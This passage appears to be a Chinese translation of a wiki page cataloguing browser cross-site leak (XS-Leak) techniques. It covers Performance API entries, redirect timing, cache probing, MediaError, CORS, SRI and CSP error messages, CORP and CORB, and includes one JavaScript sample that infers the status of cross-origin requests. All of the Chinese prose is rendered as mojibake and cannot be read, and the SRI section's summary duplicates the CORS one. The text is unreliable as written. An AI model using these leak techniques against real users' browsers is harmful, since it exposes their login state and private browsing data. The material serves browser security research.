åœ¨SAä¸­ï¼Œå¯ä»¥æ£€æµ‹XSSAuditoræ˜¯å¦è¢«è§¦å‘ï¼Œä»è€Œæ³„æ¼æ•æ„Ÿä¿¡æ¯ã€‚XSS-Auditoræ˜¯SAå’ŒGCï¼ˆç°å·²åˆ é™¤ï¼‰çš„å†…ç½®åŠŸèƒ½ï¼Œæ—¨åœ¨é˜²èŒƒè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚2013å¹´ï¼ŒBraunå’ŒHeiderich \[7]å±•ç¤ºäº†XSS-Auditorå¯ä»¥ç”¨äºé˜»æ­¢è¯¯æŠ¥çš„è‰¯æ€§è„šæœ¬ã€‚åŸºäºä»–ä»¬çš„æŠ€æœ¯ï¼Œç ”ç©¶äººå‘˜å¯ä»¥çªƒå–ä¿¡æ¯å¹¶æ£€æµ‹è·¨æºé¡µé¢ä¸Šçš„ç‰¹å®šå†…å®¹ã€‚Teradaåœ¨ä¸€ä¸ªé”™è¯¯æŠ¥å‘Šä¸­é¦–æ¬¡æè¿°äº†è¿™äº›XS-Leakï¼Œä¹‹åHeyesåœ¨ä¸€ç¯‡åšæ–‡ä¸­ä¹Ÿæåˆ°äº†å®ƒä»¬ã€‚ç„¶è€Œï¼Œå‘ç°çš„æŠ€æœ¯ä»…é€‚ç”¨äºGCä¸­çš„XSS-Auditorï¼Œåœ¨SAä¸­ä¸èµ·ä½œç”¨ã€‚æˆ‘ä»¬å‘ç°è¢«é˜»æ­¢çš„é¡µé¢ä¸ä¼šåˆ›å»ºæ€§èƒ½APIæ¡ç›®ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…ä»ç„¶å¯ä»¥ä½¿ç”¨SAä¸­çš„XSS-Auditoræ³„æ¼æ•æ„Ÿä¿¡æ¯ã€‚

### X-Frameæ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **æ‘˜è¦**ï¼šå…·æœ‰X-Frame-Optionså¤´éƒ¨çš„èµ„æºä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

å¦‚æœä¸€ä¸ªé¡µé¢**ä¸å…è®¸**åœ¨**iframe**ä¸­**æ¸²æŸ“**ï¼Œå®ƒå°†**ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥æ£€æµ‹å“åº”å¤´éƒ¨**`X-Frame-Options`**ã€‚\
å¦‚æœä½¿ç”¨**embed**æ ‡ç­¾ä¹Ÿæ˜¯å¦‚æ­¤ã€‚

### ä¸‹è½½æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šä¸‹è½½ä¸ä¼šåœ¨æ€§èƒ½APIä¸­åˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

ç±»ä¼¼äºæè¿°çš„XS-Leakï¼Œç”±äºContentDispositionå¤´éƒ¨è€Œå¯¼è‡´**ä¸‹è½½çš„èµ„æº**ä¹Ÿ**ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚è¿™ç§æŠ€æœ¯é€‚ç”¨äºæ‰€æœ‰ä¸»è¦æµè§ˆå™¨ã€‚

### é‡å®šå‘å¼€å§‹æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šèµ„æºè®¡æ—¶æ¡ç›®æ³„æ¼é‡å®šå‘çš„å¼€å§‹æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªXS-Leakå®ä¾‹ï¼Œæ»¥ç”¨äº†ä¸€äº›æµè§ˆå™¨è®°å½•è·¨æºè¯·æ±‚è¿‡å¤šä¿¡æ¯çš„è¡Œä¸ºã€‚æ ‡å‡†å®šä¹‰äº†ä¸€ç»„åº”è¯¥å¯¹è·¨æºèµ„æºè®¾ç½®ä¸ºé›¶çš„å±æ€§å­é›†ã€‚ç„¶è€Œï¼Œåœ¨**SA**ä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥è¯¢**Performance API**å¹¶æ£€æŸ¥**redirectStart**è®¡æ—¶æ•°æ®æ¥æ£€æµ‹ç”¨æˆ·æ˜¯å¦è¢«ç›®æ ‡é¡µé¢é‡å®šå‘ã€‚

### æŒç»­æ—¶é—´é‡å®šå‘æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šé‡å®šå‘æ—¶ï¼Œè®¡æ—¶æ¡ç›®çš„æŒç»­æ—¶é—´ä¸ºè´Ÿæ•°ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

åœ¨GCä¸­ï¼Œå¯¼è‡´é‡å®šå‘çš„è¯·æ±‚çš„**æŒç»­æ—¶é—´ä¸ºè´Ÿæ•°**ï¼Œå› æ­¤å¯ä»¥ä¸ä¸å¯¼è‡´é‡å®šå‘çš„è¯·æ±‚è¿›è¡Œ**åŒºåˆ†**ã€‚
### å…¬å¸æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šFrames
* **å¯æ£€æµ‹å·®å¼‚**ï¼šHeader
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šä½¿ç”¨CORPä¿æŠ¤çš„èµ„æºä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**nextHopProtocolæ¡ç›®**å¯ä»¥ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚åœ¨GCä¸­ï¼Œå½“è®¾ç½®äº†**CORP header**æ—¶ï¼ŒnextHopProtocolå°†ä¸ºç©ºã€‚è¯·æ³¨æ„ï¼Œå¯¹äºå¯ç”¨CORPçš„èµ„æºï¼ŒSAå°†æ ¹æœ¬ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®ã€‚

### æœåŠ¡å·¥ä½œè€…

* **åŒ…å«æ–¹æ³•**ï¼šFrames
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **æ‘˜è¦**ï¼šæ£€æµ‹æœåŠ¡å·¥ä½œè€…æ˜¯å¦ä¸ºç‰¹å®šæ¥æºæ³¨å†Œã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

æœåŠ¡å·¥ä½œè€…æ˜¯åœ¨ä¸€ä¸ªæ¥æºä¸Šè¿è¡Œçš„äº‹ä»¶é©±åŠ¨è„šæœ¬ä¸Šä¸‹æ–‡ã€‚å®ƒä»¬åœ¨ç½‘é¡µçš„åå°è¿è¡Œï¼Œå¯ä»¥æ‹¦æˆªã€ä¿®æ”¹å’Œ**ç¼“å­˜èµ„æº**ä»¥åˆ›å»ºç¦»çº¿Webåº”ç”¨ç¨‹åºã€‚\
å¦‚æœé€šè¿‡**iframe**è®¿é—®ç”±æœåŠ¡å·¥ä½œè€…ç¼“å­˜çš„**èµ„æº**ï¼Œåˆ™èµ„æºå°†ä»æœåŠ¡å·¥ä½œè€…ç¼“å­˜ä¸­åŠ è½½ã€‚\
è¦æ£€æµ‹èµ„æºæ˜¯å¦ä»æœåŠ¡å·¥ä½œè€…ç¼“å­˜ä¸­åŠ è½½ï¼Œå¯ä»¥ä½¿ç”¨**Performance API**ã€‚\
è¿™ä¹Ÿå¯ä»¥é€šè¿‡å®šæ—¶æ”»å‡»æ¥å®ç°ï¼ˆè¯¦ç»†ä¿¡æ¯è¯·å‚é˜…è®ºæ–‡ï¼‰ã€‚

### ç¼“å­˜

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **æ‘˜è¦**ï¼šæ£€æµ‹èµ„æºæ˜¯å¦å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

ä½¿ç”¨[Performance API](xs-search.md#performance-api)å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦è¢«ç¼“å­˜ã€‚\
æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### ç½‘ç»œæŒç»­æ—¶é—´

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **æ‘˜è¦**ï¼šå¯ä»¥ä»`performance` APIä¸­æ£€ç´¢è¯·æ±‚çš„ç½‘ç»œæŒç»­æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## é”™è¯¯æ¶ˆæ¯æŠ€æœ¯

### åª’ä½“é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ ï¼ˆè§†é¢‘ï¼ŒéŸ³é¢‘ï¼‰
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **æ‘˜è¦**ï¼šåœ¨FFä¸­ï¼Œå¯ä»¥å‡†ç¡®åœ°æ³„æ¼è·¨æºè¯·æ±‚çš„çŠ¶æ€ç ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
**`MediaError`** æ¥å£çš„ `message` å±æ€§åŒ…å«äº†ä¸€ä¸ª**ä¸åŒçš„å­—ç¬¦ä¸²ï¼Œç”¨äºæˆåŠŸåŠ è½½èµ„æº**ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ¨æ–­è·¨æºèµ„æºçš„å“åº”çŠ¶æ€ã€‚

### CORS é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ‘˜è¦**ï¼šåœ¨ SA ä¸­ï¼ŒCORS é”™è¯¯æ¶ˆæ¯ä¼šæ³„éœ²é‡å®šå‘çš„å®Œæ•´ URLã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

è¿™ç§æŠ€æœ¯å…è®¸æ”»å‡»è€…æ³„éœ²ç”±è·¨æºç«™ç‚¹å‘èµ·çš„é‡å®šå‘çš„ç›®æ ‡ã€‚

CORS å…è®¸ä»ä»»ä½•ç½‘ç«™è¯»å–å’Œä½¿ç”¨å…¬å¼€å¯è®¿é—®çš„ç½‘ç»œèµ„æºã€‚åœ¨åŸºäº Webkit çš„æµè§ˆå™¨ä¸­ï¼Œå½“ CORS è¯·æ±‚å¤±è´¥æ—¶ï¼Œå¯ä»¥**è®¿é—® CORS é”™è¯¯æ¶ˆæ¯**ã€‚æ”»å‡»è€…å¯ä»¥å‘ç›®æ ‡ç½‘ç«™å‘é€ä¸€ä¸ªå¯ç”¨äº† CORS çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚åŸºäºç”¨æˆ·çŠ¶æ€è¿›è¡Œ**é‡å®šå‘**ã€‚å½“æµè§ˆå™¨æ‹’ç»è¯·æ±‚æ—¶ï¼Œé”™è¯¯æ¶ˆæ¯ä¸­ä¼šæ³„éœ²**é‡å®šå‘ç›®æ ‡çš„å®Œæ•´ URL**ã€‚é€šè¿‡è¿™ç§æ”»å‡»ï¼Œå¯ä»¥æ£€æµ‹é‡å®šå‘ã€æ³„éœ²é‡å®šå‘ä½ç½®å’Œæ•æ„Ÿçš„æŸ¥è¯¢å‚æ•°ã€‚

### SRI é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ‘˜è¦**ï¼šåœ¨ SA ä¸­ï¼ŒCORS é”™è¯¯æ¶ˆæ¯ä¼šæ³„éœ²é‡å®šå‘çš„å®Œæ•´ URLã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

æ”»å‡»è€…å¯ä»¥é€šè¿‡**å†—é•¿çš„é”™è¯¯æ¶ˆæ¯**æ³„éœ²è·¨æºå“åº”çš„å¤§å°ã€‚

å®Œæ•´æ€§å±æ€§å®šä¹‰äº†ä¸€ä¸ªåŠ å¯†å“ˆå¸Œï¼Œæµè§ˆå™¨å¯ä»¥é€šè¿‡è¯¥å“ˆå¸ŒéªŒè¯è·å–çš„èµ„æºæ˜¯å¦è¢«ç¯¡æ”¹ã€‚è¿™ä¸ªå®‰å…¨æœºåˆ¶ç§°ä¸ºå­èµ„æºå®Œæ•´æ€§ï¼ˆSRIï¼‰ã€‚å®ƒç”¨äºéªŒè¯ä»å†…å®¹åˆ†å‘ç½‘ç»œï¼ˆCDNï¼‰æä¾›çš„èµ„æºçš„å®Œæ•´æ€§ã€‚ä¸ºäº†é˜²æ­¢æ•°æ®æ³„éœ²ï¼Œè·¨æºèµ„æºå¿…é¡»å¯ç”¨ CORSã€‚å¦åˆ™ï¼Œå“åº”å°†æ— æ³•è¿›è¡Œå®Œæ•´æ€§éªŒè¯ã€‚ç±»ä¼¼äº CORS é”™è¯¯ XS-Leakï¼Œå¯ä»¥åœ¨ä½¿ç”¨å®Œæ•´æ€§å±æ€§çš„ fetch è¯·æ±‚å¤±è´¥å**æ•è·é”™è¯¯æ¶ˆæ¯**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®šä¸€ä¸ª**è™šå‡çš„å“ˆå¸Œå€¼**æ¥å¼ºåˆ¶**è§¦å‘**è¿™ä¸ª**é”™è¯¯**ã€‚åœ¨ SA ä¸­ï¼Œè¿™ä¸ªé”™è¯¯æ¶ˆæ¯ä¼šæ³„éœ²æ‰€è¯·æ±‚èµ„æºçš„å†…å®¹é•¿åº¦ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ³„éœ²æ¥æ£€æµ‹å“åº”å¤§å°çš„å·®å¼‚ï¼Œä»è€Œå®æ–½å¼ºå¤§çš„ XS-Leak æ”»å‡»ã€‚

### CSP è¿è§„/æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **æ‘˜è¦**ï¼šå¦‚æœ CSP åªå…è®¸å—å®³è€…ç½‘ç«™ï¼Œå¹¶ä¸”æˆ‘ä»¬è®¿é—®å®ƒå°è¯•é‡å®šå‘åˆ°ä¸åŒçš„åŸŸåï¼ŒCSP å°†è§¦å‘ä¸€ä¸ªå¯æ£€æµ‹çš„é”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak å¯ä»¥ä½¿ç”¨ CSP æ¥æ£€æµ‹è·¨æºç«™ç‚¹æ˜¯å¦è¢«é‡å®šå‘åˆ°ä¸åŒçš„æºã€‚è¿™ä¸ªæ³„éœ²å¯ä»¥æ£€æµ‹é‡å®šå‘ï¼Œè€Œä¸”è¿˜ä¼šæ³„éœ²é‡å®šå‘ç›®æ ‡çš„åŸŸåã€‚è¿™ç§æ”»å‡»çš„åŸºæœ¬æ€æƒ³æ˜¯åœ¨æ”»å‡»è€…ç«™ç‚¹ä¸Š**å…è®¸ç›®æ ‡åŸŸå**ã€‚ä¸€æ—¦å‘ç›®æ ‡åŸŸåå‘å‡ºè¯·æ±‚ï¼Œå®ƒä¼š**é‡å®šå‘**åˆ°ä¸€ä¸ªè·¨æºåŸŸã€‚CSP é˜»æ­¢å¯¹å®ƒçš„è®¿é—®ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª**è¿è§„æŠ¥å‘Šä½œä¸ºæ³„éœ²æŠ€æœ¯**ã€‚æ ¹æ®æµè§ˆå™¨çš„ä¸åŒï¼Œ**è¿™ä¸ªæŠ¥å‘Šå¯èƒ½ä¼šæ³„éœ²é‡å®šå‘çš„ç›®æ ‡ä½ç½®**ã€‚\
ç°ä»£æµè§ˆå™¨ä¸ä¼šæ˜¾ç¤ºè¢«é‡å®šå‘åˆ°çš„ URLï¼Œä½†ä»ç„¶å¯ä»¥æ£€æµ‹åˆ°è§¦å‘äº†è·¨æºé‡å®šå‘ã€‚

### ç¼“å­˜

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **æ‘˜è¦**ï¼šæ¸…é™¤ç¼“å­˜ä¸­çš„æ–‡ä»¶ã€‚æ‰“å¼€ç›®æ ‡é¡µé¢ï¼Œæ£€æŸ¥ç¼“å­˜ä¸­æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

æµè§ˆå™¨å¯èƒ½å¯¹æ‰€æœ‰ç½‘ç«™ä½¿ç”¨ä¸€ä¸ªå…±äº«ç¼“å­˜ã€‚æ— è®ºå…¶æ¥æºå¦‚ä½•ï¼Œéƒ½å¯ä»¥æ¨æ–­å‡ºç›®æ ‡é¡µé¢æ˜¯å¦**è¯·æ±‚äº†ç‰¹å®šçš„æ–‡ä»¶**ã€‚

å¦‚æœä¸€ä¸ªé¡µé¢åªåœ¨ç”¨æˆ·ç™»å½•ååŠ è½½å›¾åƒï¼Œæ‚¨å¯ä»¥**ä½¿èµ„æºå¤±æ•ˆ**ï¼ˆå¦‚æœå®ƒå·²ç»è¢«ç¼“å­˜ï¼Œé‚£ä¹ˆå®ƒå°†ä¸å†è¢«ç¼“å­˜ï¼Œå‚è§æ›´å¤šä¿¡æ¯é“¾æ¥ï¼‰ï¼Œ**æ‰§è¡Œä¸€ä¸ªå¯èƒ½åŠ è½½è¯¥èµ„æºçš„è¯·æ±‚**ï¼Œå¹¶å°è¯•ä½¿ç”¨**é”™è¯¯è¯·æ±‚**ï¼ˆä¾‹å¦‚ä½¿ç”¨è¿‡é•¿çš„å¼•ç”¨å¤´ï¼‰åŠ è½½èµ„æºã€‚å¦‚æœèµ„æºåŠ è½½**æ²¡æœ‰è§¦å‘ä»»ä½•é”™è¯¯**ï¼Œé‚£æ˜¯å› ä¸ºå®ƒè¢«**ç¼“å­˜**äº†ã€‚

### CSP æŒ‡ä»¤

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **æ‘˜è¦**ï¼šCSP å¤´éƒ¨æŒ‡ä»¤å¯ä»¥é€šè¿‡ CSP iframe å±æ€§è¿›è¡Œæ¢æµ‹ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

GC ä¸­çš„ä¸€ä¸ªæ–°åŠŸèƒ½å…è®¸ç½‘é¡µé€šè¿‡åœ¨ iframe å…ƒç´ ä¸Šè®¾ç½®å±æ€§æ¥æå‡º CSPã€‚ç­–ç•¥æŒ‡ä»¤ä¼šéšç€ HTTP è¯·æ±‚ä¸€èµ·ä¼ è¾“ã€‚é€šå¸¸ï¼ŒåµŒå…¥å†…å®¹å¿…é¡»ä½¿ç”¨ HTTP å¤´éƒ¨æ˜ç¡®å…è®¸æ­¤æ“ä½œï¼Œ**å¦åˆ™ä¼šæ˜¾ç¤ºé”™è¯¯é¡µé¢**ã€‚ç„¶è€Œï¼Œå¦‚æœ iframe å·²ç»åŒ…å«ä¸€ä¸ª CSPï¼Œå¹¶ä¸”æ–°çš„ç­–ç•¥ä¸æ›´ä¸¥æ ¼ï¼Œé¡µé¢å°†æ­£å¸¸æ˜¾ç¤ºã€‚

è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ£€æµ‹è·¨æºé¡µé¢çš„ç‰¹å®š CSP æŒ‡ä»¤ï¼Œå¦‚æœ**å¯ä»¥æ£€æµ‹åˆ°é”™è¯¯é¡µé¢**çš„è¯ã€‚å°½ç®¡è¿™ä¸ª bug ç°åœ¨è¢«æ ‡è®°ä¸ºå·²ä¿®å¤ï¼Œä½†æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª**æ–°çš„æ³„éœ²æŠ€æœ¯ï¼Œå¯ä»¥æ£€æµ‹åˆ°é”™è¯¯é¡µé¢ï¼Œå› ä¸ºæ ¹æœ¬é—®é¢˜ä»æœªè¢«ä¿®å¤**ã€‚
### **CORP**

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **æ‘˜è¦**: ä½¿ç”¨CORPä¿æŠ¤çš„èµ„æºåœ¨è·å–æ—¶ä¼šæŠ›å‡ºé”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORPå¤´æ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„Webå¹³å°å®‰å…¨ç‰¹æ€§ï¼Œå½“è®¾ç½®æ—¶ï¼Œä¼š**é˜»æ­¢å¯¹ç»™å®šèµ„æºçš„no-corsè·¨æºè¯·æ±‚**ã€‚å¯ä»¥é€šè¿‡æ£€æµ‹å¤´éƒ¨çš„å­˜åœ¨æ¥åˆ¤æ–­ï¼Œå› ä¸ºä½¿ç”¨CORPä¿æŠ¤çš„èµ„æºåœ¨è·å–æ—¶ä¼š**æŠ›å‡ºé”™è¯¯**ã€‚

### CORB

* **åŒ…å«æ–¹æ³•**: HTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: Headers
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **æ‘˜è¦**: CORBå¯ä»¥ä½¿æ”»å‡»è€…æ£€æµ‹åˆ°è¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨**`nosniff`å¤´éƒ¨**ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

è¯·æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ä»¥è·å–æœ‰å…³è¯¥æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### CORSé”™è¯¯çš„Origin Reflectioné…ç½®é”™è¯¯ <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: Headers
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **æ‘˜è¦**: å¦‚æœOriginå¤´éƒ¨åœ¨`Access-Control-Allow-Origin`å¤´éƒ¨ä¸­åå°„ï¼Œå¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å·²ç»åœ¨ç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

